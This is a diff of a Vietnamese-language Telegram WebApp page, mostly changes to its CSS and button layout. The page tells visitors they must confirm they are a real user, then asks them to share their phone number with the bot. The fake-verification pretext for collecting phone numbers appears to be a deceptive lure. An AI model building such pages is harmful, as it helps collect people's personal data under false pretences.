@@ -51,7 +51,7 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   100% { transform: rotate(0deg); }
 }
 
-/* text Step 1 & Step 2 */
+/* text Step 1 */
 .step-text {
   display:inline-block;
   margin-top:20px;
@@ -66,9 +66,9 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   white-space: pre; /* giữ xuống dòng y hệt */
 }
 
-/* nút Xác nhận / Share số */
+/* nút Xác nhận & Share */
 .step-btn {
-  margin-top:15px;
+  margin-top:10px;
   padding:12px 0;
   font-size:17px;
   font-weight:600;
@@ -78,11 +78,8 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   color:#fff;
   cursor:pointer;
   display:inline-block;
-  width:100%;
+  width:100%; /* rộng bằng ô trắng */
 }
-
-/* Step2 ẩn lúc đầu */
-#step2 { display:none; }
 </style>
 </head>
 
@@ -90,42 +87,35 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
 <div class="bg"></div>
 <div class="overlay"></div>
 
-<div class="container">
-
-  <!-- STEP 1 -->
-  <div id="step1">
-    <div class="icon">👋</div>
-    <div class="step-text">
+<div class="container" id="step1-container">
+  <div class="icon">👋</div>
+  <div class="step-text">
 Bạn cần xác nhận mình là người dùng thật , hãy
      nhấp vào nút bên dưới để bắt đầu !
-    </div>
-    <button class="step-btn" onclick="showStep2()">Xác nhận</button>
   </div>
-
-  <!-- STEP 2: Share số điện thoại -->
-  <div id="step2">
-    <div class="step-text">
-📱 Vui lòng chia sẻ số điện thoại của bạn:
-    </div>
-    <button class="step-btn" onclick="sharePhone()">📲 Chia sẻ số điện thoại</button>
-  </div>
-
+  
+  <!-- Nút xác nhận -->
+  <button class="step-btn" onclick="showShare()">Xác nhận</button>
+  
+  <!-- Nút share số điện thoại ẩn lúc đầu -->
+  <button class="step-btn" id="share-btn" style="display:none;" onclick="sharePhone()">📲 Chia sẻ số điện thoại</button>
 </div>
 
 <script>
 let tg = window.Telegram.WebApp;
 tg.expand();
 
-// Hiện Step 2
-function showStep2(){
-  document.getElementById("step1").style.display = "none";
-  document.getElementById("step2").style.display = "block";
+// Khi nhấn xác nhận → hiện nút share số
+function showShare(){
+  document.getElementById("share-btn").style.display = "block";
+  // Nếu muốn, có thể ẩn nút Xác nhận:
+  // event.target.style.display = "none";
 }
 
 // Gửi dữ liệu về bot khi share số
 function sharePhone(){
   tg.sendData("request_phone");
-  alert("Bấm nút share số trên Telegram để gửi số điện thoại của bạn!");
+  alert("Bấm nút share số trên Telegram để gửi số điện thoại!");
 }
 </script>
 </body>
